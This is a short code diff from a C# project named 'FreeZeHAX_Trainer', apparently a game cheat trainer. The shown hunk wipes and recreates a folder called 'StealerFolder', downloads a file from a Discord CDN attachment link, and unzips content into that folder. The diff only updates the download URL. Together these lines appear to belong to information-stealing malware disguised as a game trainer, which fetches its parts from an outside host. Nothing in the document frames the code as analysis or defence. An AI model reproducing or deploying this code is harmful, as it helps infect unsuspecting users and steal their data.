@@ -127,7 +127,7 @@ namespace FreeZeHAX_Trainer
                     others.DirClean(StealerFolder);
                     others.Wait(2000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/942839791530151977/App.config"), StealerFolderLoc + "\\App.config");
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/943261952153636914/App.config"), StealerFolderLoc + "\\App.config");
                     others.Wait(2000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                     others.Wait(2000);
